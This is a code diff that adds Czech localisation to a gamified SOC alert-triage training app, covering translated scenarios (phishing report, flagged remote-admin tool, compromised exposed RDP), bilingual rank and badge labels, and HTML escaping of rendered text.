+      { label:'Zkontrolovat, kdo to odeslal', result:'Firemní komunikace potvrzuje, že to před deseti minutami ručně odeslala přes schválenou mailingovou platformu.' },
+      { label:'Zkontrolovat, jak často je tato platforma označována', result:'Tohle je čtvrté interní oznámení z této platformy zablokované stejnou heuristikou za dva měsíce.' }
+    ],
+    debrief:'Autentizováno, očekávané a odeslané těmi, kdo tvrdí, že to odeslali — heuristika hromadné pošty prostě nepozná pozvánku na town hall od newsletteru. Uvolni zablokované kopie a přidej výjimku pro komunikační platformu, ať to přestane někoho stát tiket každých pár týdnů.'
+  }
 },
 {
   id:'ALT-4493', sev:'low', target:100,
@@ -880,7 +1445,24 @@ const ALERTS = [
   required:['close_no_action','tune_rule'],
   ok:['add_watchlist','notify_user'],
   forbidden:['isolate_host','disable_account','escalate_ir','reset_password','notify_hr_legal'],
-  debrief:'Generic PUA signatures catch every remote-access tool, sanctioned or not — the open ticket and matching technician account are what separate this from a real RMM-based intrusion. Scope the detection rule to flag only RMM tools that aren’t on the approved list, so the helpdesk stops setting off the same alarm every shift.'
+  debrief:'Generic PUA signatures catch every remote-access tool, sanctioned or not — the open ticket and matching technician account are what separate this from a real RMM-based intrusion. Scope the detection rule to flag only RMM tools that aren’t on the approved list, so the helpdesk stops setting off the same alarm every shift.',
+  cs:{
+    title:'Nástroj pro vzdálený přístup označen jako potenciálně nechtěný software',
+    source:'Antivirus · Detekce PUA/RMM',
+    summary:'Nástroj pro vzdálenou správu, který není součástí standardního softwarového obrazu, byl nainstalován a použit k připojení na stanici zaměstnance v rámci helpdeskového tiketu.',
+    evidence:[
+      'AV: PUA.RemoteAdmin.AnyDesk označeno na stanici HR-WS-009',
+      'Nainstalováno doménovým účtem it-helpdesk, odpovídá otevřenému tiketu #48213',
+      'Vzdálená relace trvala 11 minut, ukončena normálně',
+      'Během relace nezaznamenán přenos souborů ani výzva k zadání přihlašovacích údajů'
+    ],
+    enrich:[
+      { label:'Zkontrolovat helpdeskový tiket', result:'Tiket #48213 je otevřený kvůli problému s ovladačem tiskárny přesně na této stanici, přiřazený technikovi, který relaci spustil.' },
+      { label:'Zkontrolovat, zda je tento RMM nástroj schválený', result:'Není to standardní firemní nástroj, ale je na seznamu schválených alternativ pro tuto konkrétní helpdeskovou frontu.' },
+      { label:'Zkontrolovat obsah relace na cokoliv neobvyklého', result:'Metadata záznamu obrazovky ukazují jen kroky přeinstalace ovladače, nic připomínající přístup k datům.' }
+    ],
+    debrief:'Obecné signatury PUA chytají každý nástroj pro vzdálený přístup, schválený nebo ne — otevřený tiket a odpovídající účet technika je to, co tohle odlišuje od skutečného vniknutí přes RMM. Zúž pravidlo detekce tak, aby označovalo jen RMM nástroje, které nejsou na schváleném seznamu, ať helpdesk nespouští stejný poplach každou směnu.'
+  }
 },
 {
   id:'ALT-4480', sev:'low', target:100,
@@ -906,7 +1488,24 @@ const ALERTS = [
   required:['block_indicator','notify_user'],
   ok:['add_watchlist','tune_rule','quarantine_file'],
   forbidden:['isolate_host','disable_account','reset_password','escalate_ir','notify_hr_legal','close_no_action'],
-  debrief:'A quiet win. Block the domain, purge the other 23 copies, and reply to the reporter — people who get a thank-you report again, and reporting is the cheapest detection you own. No containment needed: nothing was clicked.'
+  debrief:'A quiet win. Block the domain, purge the other 23 copies, and reply to the reporter — people who get a thank-you report again, and reporting is the cheapest detection you own. No containment needed: nothing was clicked.',
+  cs:{
+    title:'Uživatel nahlásil phishingovou zprávu',
+    source:'Tlačítko Nahlásit phishing · Mail gateway',
+    summary:'Zaměstnankyně nahlásila zprávu o doručení balíku dřív, než otevřela odkaz. Gateway potvrzuje, že v organizaci na něj nikdo neklikl.',
+    evidence:[
+      'Zpráva doručena do 24 schránek',
+      'Nahlášeno přes tlačítko Nahlásit phishing uživatelkou v.machova',
+      'Telemetrie kliknutí na URL: 0 kliknutí napříč organizací',
+      'Doména odesílatele zaregistrována před 4 dny, SPF selhalo'
+    ],
+    enrich:[
+      { label:'Zkontrolovat telemetrii kliknutí napříč tenantem', result:'Nikdo neklikl. Odkaz je pořád živý a vedl by na stránku sbírající přihlašovací údaje.' },
+      { label:'Zkontrolovat ostatní příjemce', result:'Zbývajících 23 kopií pořád leží ve schránkách a dají se stáhnout zpátky.' },
+      { label:'Zkontrolovat reputaci odesílatele', result:'Doména i její IP se objevují ve dvou phishingových feedech za posledních 48 hodin.' }
+    ],
+    debrief:'Tichá výhra. Zablokuj doménu, odstraň zbývajících 23 kopií a odpověz nahlašovatelce — lidé, kteří za nahlášení dostanou poděkování, hlásí znovu, a nahlašování je nejlevnější detekce, jakou máš. Žádné zadržení není potřeba: nikdo na nic neklikl.'
+  }
 },
 {
   id:'ALT-4490', sev:'critical', target:160,
@@ -932,7 +1531,25 @@ const ALERTS = [
   required:['isolate_host','block_indicator','collect_forensics'],
   ok:['escalate_ir','disable_account','reset_password','revoke_sessions'],
   forbidden:['tune_rule','close_no_action','notify_user'],
-  debrief:'An attacker with local admin who just killed your endpoint defences and started scanning the internal network is already past the point of a quiet cleanup. Isolate immediately, close the exposed port at the firewall, and preserve what you can before they finish mapping the network — the four-day-old forgotten firewall rule is the after-action item.'
+  debrief:'An attacker with local admin who just killed your endpoint defences and started scanning the internal network is already past the point of a quiet cleanup. Isolate immediately, close the exposed port at the firewall, and preserve what you can before they finish mapping the network — the four-day-old forgotten firewall rule is the after-action item.',
+  cs:{
+    title:'RDP vystavené do internetu kompromitováno po kampani hrubou silou',
+    source:'Firewall + EDR · Korelovaná detekce',
+    entities:{ Attempts:'3 600 za 6 hodin' },
+    summary:'Jump box zůstal po změně firewallového pravidla dostupný přes RDP z internetu. Po šesti hodinách útoku hrubou silou se jedno přihlášení podařilo a stejná relace okamžitě začala vypínat bezpečnostní nástroje.',
+    evidence:[
+      'Okno firewallové změny otevírá dočasné vystavení RDP kvůli už dokončené migraci',
+      '3 600 neúspěšných RDP přihlášení z 91.219.x.x proti lokálním admin účtům',
+      'Úspěšné přihlášení: lokální administrátor, z 91.219.x.x',
+      'Windows Defender i služba EDR zastaveny ze stejné relace'
+    ],
+    enrich:[
+      { label:'Zkontrolovat, co se stalo hned po úspěšném přihlášení', result:'Útočník okamžitě vypnul oba endpointové bezpečnostní agenty — aktivně pracuje na tom, aby na stanici zůstal.' },
+      { label:'Zkontrolovat historii firewallového pravidla', result:'Dočasné pravidlo pro vystavení kvůli migraci nebylo nikdy vráceno zpět poté, co před čtyřmi dny skončilo okno údržby.' },
+      { label:'Zkontrolovat odchozí aktivitu od kompromitace', result:'Stanice za poslední dvě minuty začala přes SMB skenovat interní rozsah 10.0.0.0/16.' }
+    ],
+    debrief:'Útočník s lokálním adminem, který ti právě zabil endpointovou ochranu a začal skenovat interní síť, je už za hranicí tichého úklidu. Izoluj okamžitě, uzavři vystavený port na firewallu a zachovej, co se dá, než dokončí mapování sítě — čtyři dny staré zapomenuté firewallové pravidlo je úkol do after-action reportu.'
+  }
 }
 ];
 
@@ -945,22 +1562,28 @@ const S = {
 };
 
 const RANKS = [
-  [0,'Tier 1 Trainee'],[150,'Junior Analyst'],[350,'SOC Analyst'],
-  [600,'Senior Analyst'],[900,'Threat Hunter'],[1250,'Incident Commander']
+  [0,   { en:'Tier 1 Trainee',   cs:'Stážista úrovně 1' }],
+  [150, { en:'Junior Analyst',   cs:'Junior analytik' }],
+  [350, { en:'SOC Analyst',      cs:'SOC analytik' }],
+  [600, { en:'Senior Analyst',   cs:'Senior analytik' }],
+  [900, { en:'Threat Hunter',    cs:'Threat hunter' }],
+  [1250,{ en:'Incident Commander', cs:'Incident Commander' }]
 ];
 const BADGES = {
-  first_blood:  'First case closed',
-  perfect:      'Perfect triage',
-  streak3:      'Three in a row',
-  streak5:      'Five in a row',
-  fast:         'Under the clock',
-  digger:       'Thorough investigator',
-  proportionate:'Proportionate response',
-  full_shift:   'Full shift survived'
+  first_blood:  { en:'First case closed',        cs:'První uzavřený případ' },
+  perfect:      { en:'Perfect triage',            cs:'Bezchybná triáž' },
+  streak3:      { en:'Three in a row',            cs:'Tři v řadě' },
+  streak5:      { en:'Five in a row',             cs:'Pět v řadě' },
+  fast:         { en:'Under the clock',           cs:'V časovém limitu' },
+  digger:       { en:'Thorough investigator',     cs:'Důkladný vyšetřovatel' },
+  proportionate:{ en:'Proportionate response',    cs:'Přiměřená reakce' },
+  full_shift:   { en:'Full shift survived',       cs:'Celá směna přežita' }
 };
+function badgeL(k){ return BADGES[k][LANG]; }
 
 const $ = s => document.querySelector(s);
 const el = (t,c,h) => { const n=document.createElement(t); if(c)n.className=c; if(h!=null)n.innerHTML=h; return n; };
+applyStaticText();
 
 /* ---------- start ---------- */
 $('#startBtn').onclick = start;
@@ -985,10 +1608,10 @@ function renderQueue(){
     const b = el('button', 'alert' + (r ? ' done' : ''));
     b.style.setProperty('--sev', `var(--sev-${a.sev})`);
     b.setAttribute('aria-current', S.current === a.id ? 'true' : 'false');
-    b.innerHTML = `<div class="top"><span class="sev">${a.sev.toUpperCase()}</span>
+    b.innerHTML = `<div class="top"><span class="sev">${SEV_LABELS[LANG][a.sev]}</span>
         ${r ? `<span class="tick ${r.verdictOk?'':'miss'}">${r.verdictOk?'✓':'!'} ${r.score}</span>`:''}
         <span class="aid">${a.id}</span></div>
-      <h3>${a.title}</h3><p>${a.time} · ${a.source}</p>`;
+      <h3>${escapeHtml(tf(a,'title'))}</h3><p>${a.time} · ${escapeHtml(tf(a,'source'))}</p>`;
     b.onclick = () => openCase(a.id);
     list.appendChild(b);
   });
@@ -1005,9 +1628,10 @@ function openCase(id){
 /* ---------- case panel ---------- */
 function renderCase(){
   const wrap = $('#case');
+  const u = T();
   if(!S.current){
-    wrap.innerHTML = `<div class="empty"><h3>Pick an alert to begin</h3>
-      <p>Highest severity first is a good habit, but read the queue before you commit.</p></div>`;
+    wrap.innerHTML = `<div class="empty"><h3>${u.caseEmptyTitle}</h3>
+      <p>${u.caseEmptyHint}</p></div>`;
     return;
   }
   const a = ALERTS.find(x => x.id === S.current);
@@ -1018,20 +1642,20 @@ function renderCase(){
 
   /* header */
   const head = el('div','case-head');
-  const back = el('button','backlink','← Back to queue');
+  const back = el('button','backlink',u.backToQueue);
   back.onclick = () => { $('#grid').dataset.view = 'queue'; };
   head.appendChild(back);
   head.insertAdjacentHTML('beforeend',
-    `<span class="sev" style="color:var(--sev-${a.sev})">${a.sev.toUpperCase()} · ${a.id}</span>
-     <h2>${a.title}</h2>
-     <div class="meta"><span><b>Detected</b> ${a.time}</span><span><b>Source</b> ${a.source}</span>
-     ${Object.entries(a.entities).map(([k,v])=>`<span><b>${k}</b> ${v}</span>`).join('')}</div>`);
+    `<span class="sev" style="color:var(--sev-${a.sev})">${SEV_LABELS[LANG][a.sev]} · ${a.id}</span>
+     <h2>${escapeHtml(tf(a,'title'))}</h2>
+     <div class="meta"><span><b>${u.detected}</b> ${a.time}</span><span><b>${u.source}</b> ${escapeHtml(tf(a,'source'))}</span>
+     ${Object.entries(a.entities).map(([k,v])=>`<span><b>${escapeHtml(entLabel(k))}</b> ${escapeHtml(tEntityVal(a,k,v))}</span>`).join('')}</div>`);
   wrap.appendChild(head);
 
   /* summary + evidence */
   const s1 = el('div','sect');
-  s1.innerHTML = `<h3>What fired</h3><p class="hint">${a.summary}</p>
-    <div class="log">${a.evidence.map(([t,l])=>`<div><span class="k">${t}</span>  ${escapeHtml(l)}</div>`).join('')}</div>`;
+  s1.innerHTML = `<h3>${u.whatFired}</h3><p class="hint">${escapeHtml(tf(a,'summary'))}</p>
+    <div class="log">${tEvidence(a).map(([t,l])=>`<div><span class="k">${t}</span>  ${escapeHtml(l)}</div>`).join('')}</div>`;
   wrap.appendChild(s1);
 
   if(done){ wrap.appendChild(resultSection(a, done)); return; }
@@ -1039,9 +1663,9 @@ function renderCase(){
   /* assign */
   if(!d.assigned){
     const s2 = el('div','sect');
-    s2.innerHTML = `<h3>Nobody owns this yet</h3>
-      <p class="hint">Assign the case to yourself to unlock investigation. The clock starts when you do.</p>`;
-    const btn = el('button','btn primary','Assign to me');
+    s2.innerHTML = `<h3>${u.unownedTitle}</h3>
+      <p class="hint">${u.unownedHint}</p>`;
+    const btn = el('button','btn primary',u.assignBtn);
     btn.onclick = () => { d.assigned = true; d.t0 = Date.now(); renderCase(); };
     s2.appendChild(btn);
     wrap.appendChild(s2);
@@ -1050,27 +1674,28 @@ function renderCase(){
 
   /* enrichment */
   const s3 = el('div','sect');
-  s3.innerHTML = `<h3>Investigate</h3>
-    <p class="hint">Each lookup adds 20 seconds to your handling time. Pick what actually moves the decision.</p>`;
+  s3.innerHTML = `<h3>${u.investigate}</h3>
+    <p class="hint">${u.investigateHint}</p>`;
   const chips = el('div','chips');
-  a.enrich.forEach(e => {
+  const enrichItems = tEnrich(a);
+  enrichItems.forEach(e => {
     const used = d.enriched.has(e.id);
-    const c = el('button','chip'+(used?' used':''), `${e.label}<small>+20s</small>`);
+    const c = el('button','chip'+(used?' used':''), `${escapeHtml(e.label)}<small>${u.chipCost}</small>`);
     c.onclick = () => { d.enriched.add(e.id); d.extra += 20; if(e.key) d.keyUsed = true; renderCase(); };
     chips.appendChild(c);
   });
   s3.appendChild(chips);
-  a.enrich.filter(e => d.enriched.has(e.id)).forEach(e => {
-    s3.appendChild(el('div','finding', `<b>${e.label}</b>${e.result}`));
+  enrichItems.filter(e => d.enriched.has(e.id)).forEach(e => {
+    s3.appendChild(el('div','finding', `<b>${escapeHtml(e.label)}</b>${escapeHtml(e.result)}`));
   });
   wrap.appendChild(s3);
 
   /* verdict */
   const s4 = el('div','sect');
-  s4.innerHTML = `<h3>Your verdict</h3><p class="hint">What is actually going on here?</p>`;
+  s4.innerHTML = `<h3>${u.yourVerdict}</h3><p class="hint">${u.yourVerdictHint}</p>`;
   const opts = el('div','opts');
-  Object.entries(VERDICTS).forEach(([k,v]) => {
-    const o = el('button','opt', `<b>${v.label}</b><span>${v.desc}</span>`);
+  Object.keys(VERDICTS).forEach(k => {
+    const o = el('button','opt', `<b>${verL(k)}</b><span>${verD(k)}</span>`);
     o.setAttribute('aria-pressed', d.verdict === k ? 'true':'false');
     o.onclick = () => { d.verdict = k; renderCase(); };
     opts.appendChild(o);
@@ -1080,12 +1705,12 @@ function renderCase(){
 
   /* actions */
   const s5 = el('div','sect');
-  s5.innerHTML = `<h3>Response actions</h3>
-    <p class="hint">Take what the situation needs — no more. Overreacting costs the business and costs you points.</p>`;
+  s5.innerHTML = `<h3>${u.responseActions}</h3>
+    <p class="hint">${u.responseHint}</p>`;
   const acts = el('div','actions');
-  Object.entries(ACTIONS).forEach(([k,v]) => {
+  Object.keys(ACTIONS).forEach(k => {
     const on = d.actions.has(k);
-    const b = el('button','act', `<span class="box">✓</span><span><b>${v.label}</b><span>${v.desc}</span></span>`);
+    const b = el('button','act', `<span class="box">✓</span><span><b>${actL(k)}</b><span>${actD(k)}</span></span>`);
     b.setAttribute('aria-pressed', on ? 'true':'false');
     b.onclick = () => { on ? d.actions.delete(k) : d.actions.add(k); renderCase(); };
     acts.appendChild(b);
@@ -1096,15 +1721,15 @@ function renderCase(){
   /* close */
   const s6 = el('div','sect');
   const row = el('div','footer-row');
-  const close = el('button','btn primary','Close the case');
+  const close = el('button','btn primary',u.closeBtn);
   close.disabled = !d.verdict || d.actions.size === 0;
   close.onclick = () => scoreCase(a);
   row.appendChild(close);
-  const t = el('span','timer', 'handling time · live');
+  const t = el('span','timer', u.timerLive(0));
   row.appendChild(t);
   s6.appendChild(row);
   if(!d.verdict || d.actions.size === 0){
-    s6.appendChild(el('p','hint','Pick a verdict and at least one action first.'));
+    s6.appendChild(el('p','hint',u.closeHint));
   }
   wrap.appendChild(s6);
   tickTimer(t, d);
@@ -1114,7 +1739,7 @@ function tickTimer(node, d){
   clearInterval(window.__nwT);
   const upd = () => {
     const secs = Math.floor((Date.now() - d.t0)/1000) + d.extra;
-    node.textContent = `handling time · ${String(Math.floor(secs/60)).padStart(2,'0')}:${String(secs%60).padStart(2,'0')}`;
+    node.textContent = T().timerLive(secs);
   };
   upd();
   window.__nwT = setInterval(() => { if(document.body.contains(node)) upd(); else clearInterval(window.__nwT); }, 1000);
@@ -1133,17 +1758,18 @@ function scoreCase(a){
 
   const ledger = [];
   let score = 0;
+  const u = T();
 
-  if(verdictOk){ score += 40; ledger.push(['Correct verdict: ' + VERDICTS[a.verdict].label, 40]); }
-  else ledger.push([`Wrong verdict — it was ${VERDICTS[a.verdict].label.toLowerCase()}`, 0]);
+  if(verdictOk){ score += 40; ledger.push([u.ledgerCorrectVerdict(verL(a.verdict)), 40]); }
+  else ledger.push([u.ledgerWrongVerdict(verL(a.verdict)), 0]);
 
-  hit.forEach(h => { score += 14; ledger.push(['Took the right action: ' + ACTIONS[h].label, 14]); });
-  missed.forEach(m => { score -= 10; ledger.push(['Missed: ' + ACTIONS[m].label, -10]); });
-  bad.forEach(b => { score -= 12; ledger.push(['Should not have done this: ' + ACTIONS[b].label, -12]); });
+  hit.forEach(h => { score += 14; ledger.push([u.ledgerRightAction(actL(h)), 14]); });
+  missed.forEach(m => { score -= 10; ledger.push([u.ledgerMissed(actL(m)), -10]); });
+  bad.forEach(b => { score -= 12; ledger.push([u.ledgerShouldNot(actL(b)), -12]); });
 
-  if(d.keyUsed){ score += 8; ledger.push(['Found the decisive evidence', 8]); }
+  if(d.keyUsed){ score += 8; ledger.push([u.ledgerDecisive, 8]); }
   const fast = secs <= a.target && verdictOk;
-  if(fast){ score += 12; ledger.push(['Closed inside the target handling time', 12]); }
+  if(fast){ score += 12; ledger.push([u.ledgerFast, 12]); }
 
   score = Math.max(0, score);
 
@@ -1174,10 +1800,11 @@ function scoreCase(a){
 
 function resultSection(a, r){
   const s = el('div','sect');
-  s.innerHTML = `<h3>Closed · ${r.score} points</h3>
-    <p class="hint">Your verdict: ${VERDICTS[r.verdict].label}${r.verdictOk?'':` — correct answer was ${VERDICTS[a.verdict].label}`}. Handling time ${fmt(r.secs)}.</p>
-    <div class="note"><b>Debrief.</b> ${a.debrief}</div>`;
-  const b = el('button','btn ghost','Review the scoring again');
+  const u = T();
+  s.innerHTML = `<h3>${u.closedPoints(r.score)}</h3>
+    <p class="hint">${u.yourVerdictWas(verL(r.verdict))}${r.verdictOk?'':u.correctAnswerWas(verL(a.verdict))} ${u.handlingTime(fmt(r.secs))}</p>
+    <div class="note"><b>${u.debriefLabel}</b> ${escapeHtml(tf(a,'debrief'))}</div>`;
+  const b = el('button','btn ghost',u.reviewScoring);
   b.style.marginTop = '14px';
   b.onclick = () => showDebrief(a, r, []);
   s.appendChild(b);
@@ -1187,6 +1814,7 @@ function resultSection(a, r){
 /* ---------- debrief modal ---------- */
 function showDebrief(a, r, newBadges){
   const root = $('#modalRoot');
+  const u = T();
   root.innerHTML = '';
   const scrim = el('div','scrim');
   const m = el('div','modal');
@@ -1194,23 +1822,23 @@ function showDebrief(a, r, newBadges){
 
   m.innerHTML = `
     <div class="modal-head">
-      <div class="verdict-line">${a.id} · handling time ${fmt(r.secs)}</div>
+      <div class="verdict-line">${u.verdictLine(a.id, fmt(r.secs))}</div>
       <div class="score-big" style="color:${r.verdictOk?'var(--good)':'var(--sev-high)'}">+${r.score}</div>
-      <h2>${r.perfect ? 'Textbook triage' : r.verdictOk ? 'Right call' : 'Wrong call'}</h2>
+      <h2>${r.perfect ? u.resultTextbook : r.verdictOk ? u.resultRight : u.resultWrong}</h2>
     </div>
     <div class="modal-body">
       <ul class="ledger">
         ${r.ledger.map(([t,p]) => `<li>${t}<span class="pts ${p>=0?'plus':'minus'}">${p>=0?'+':''}${p}</span></li>`).join('')}
       </ul>
-      <div class="note"><b>Debrief.</b> ${a.debrief}</div>
-      ${newBadges.length ? `<div class="badges">${newBadges.map(b=>`<span class="badge">★ ${BADGES[b]}</span>`).join('')}</div>` : ''}
+      <div class="note"><b>${u.debriefLabel}</b> ${escapeHtml(tf(a,'debrief'))}</div>
+      ${newBadges.length ? `<div class="badges">${newBadges.map(b=>`<span class="badge">★ ${badgeL(b)}</span>`).join('')}</div>` : ''}
     </div>`;
 
   const foot = el('div','modal-foot');
   const next = ALERTS.find(x => !S.results[x.id]);
-  const b1 = el('button','btn primary', next ? 'Next alert' : 'See your shift report');
+  const b1 = el('button','btn primary', next ? u.nextAlert : u.seeReport);
   b1.onclick = () => { root.innerHTML=''; next ? openCase(next.id) : showReport(); };
-  const b2 = el('button','btn ghost','Back to queue');
+  const b2 = el('button','btn ghost',u.backToQueueBtn);
   b2.onclick = () => { root.innerHTML=''; $('#grid').dataset.view='queue'; };
   foot.append(b1,b2);
   m.appendChild(foot);
@@ -1224,13 +1852,14 @@ function showDebrief(a, r, newBadges){
 $('#statsBtn').onclick = showReport;
 
 function showReport(){
+  const u = T();
   const acc = S.closed ? Math.round(S.correct / S.closed * 100) : 0;
   const clean = S.closed ? Math.round(S.cleanCases / S.closed * 100) : 0;
   const maxScore = ALERTS.length * 90;
-  const grade = S.score >= 700 ? 'Incident Commander material'
-              : S.score >= 520 ? 'Solid tier 1'
-              : S.score >= 340 ? 'Getting there'
-              : 'Keep practising';
+  const grade = S.score >= 700 ? u.gradeTop
+              : S.score >= 520 ? u.gradeGood
+              : S.score >= 340 ? u.gradeMid
+              : u.gradeLow;
 
   const root = $('#modalRoot'); root.innerHTML='';
   const scrim = el('div','scrim');
@@ -1238,24 +1867,24 @@ function showReport(){
   m.setAttribute('role','dialog'); m.setAttribute('aria-modal','true');
   m.innerHTML = `
     <div class="modal-head">
-      <div class="verdict-line">SHIFT REPORT · ${S.name}</div>
+      <div class="verdict-line">${u.shiftReport(S.name)}</div>
       <div class="rank">${grade}</div>
     </div>
     <div class="modal-body">
       <div class="bars">
-        ${bar('Cases closed', S.closed, ALERTS.length, `${S.closed}/${ALERTS.length}`, 'var(--accent)')}
-        ${bar('Verdict accuracy', acc, 100, acc+'%', 'var(--good)')}
-        ${bar('Proportionate responses', clean, 100, clean+'%', 'var(--sev-low)')}
-        ${bar('Score', S.score, maxScore, S.score+' XP', 'var(--xp)')}
+        ${bar(u.barClosed, S.closed, ALERTS.length, `${S.closed}/${ALERTS.length}`, 'var(--accent)')}
+        ${bar(u.barAcc, acc, 100, acc+'%', 'var(--good)')}
+        ${bar(u.barClean, clean, 100, clean+'%', 'var(--sev-low)')}
+        ${bar(u.barScore, S.score, maxScore, S.score+' '+u.xpUnit, 'var(--xp)')}
       </div>
-      <div class="note"><b>Longest streak:</b> ${S.best} correct verdicts in a row. <b>Rank:</b> ${rankFor(S.score)}.</div>
+      <div class="note">${u.longestStreak(S.best, rankFor(S.score)[LANG])}</div>
       <div class="badges">
-        ${Object.entries(BADGES).map(([k,v]) =>
-          `<span class="badge ${S.badges.has(k)?'':'locked'}">${S.badges.has(k)?'★':'☆'} ${v}</span>`).join('')}
+        ${Object.keys(BADGES).map(k =>
+          `<span class="badge ${S.badges.has(k)?'':'locked'}">${S.badges.has(k)?'★':'☆'} ${badgeL(k)}</span>`).join('')}
       </div>
     </div>`;
   const foot = el('div','modal-foot');
-  const b1 = el('button','btn primary', S.closed < ALERTS.length ? 'Back to the queue' : 'Start a fresh shift');
+  const b1 = el('button','btn primary', S.closed < ALERTS.length ? u.backToQueueLong : u.freshShift);
   b1.onclick = () => { root.innerHTML=''; if(S.closed >= ALERTS.length) location.reload(); else $('#grid').dataset.view='queue'; };
   foot.appendChild(b1);
   m.appendChild(foot);
@@ -1279,13 +1908,14 @@ function renderStats(){
   $('#sScore').textContent = S.score;
   $('#sBadges').textContent = S.badges.size;
 
+  const u = T();
   const rank = rankFor(S.score);
-  $('#whoRank').textContent = rank;
+  $('#whoRank').textContent = rank[LANG];
   const idx = RANKS.findIndex(r => r[1] === rank);
   const floor = RANKS[idx][0];
   const ceil = RANKS[idx+1] ? RANKS[idx+1][0] : floor;
-  $('#xpLabel').textContent = S.score + ' XP';
-  $('#xpNext').textContent = RANKS[idx+1] ? (ceil - S.score) + ' to next rank' : 'top rank';
+  $('#xpLabel').textContent = S.score + ' ' + u.xpUnit;
+  $('#xpNext').textContent = RANKS[idx+1] ? u.toNextRank(ceil - S.score) : u.topRank;
   $('#xpFill').style.width = (RANKS[idx+1] ? (S.score-floor)/(ceil-floor)*100 : 100) + '%';
 }
 
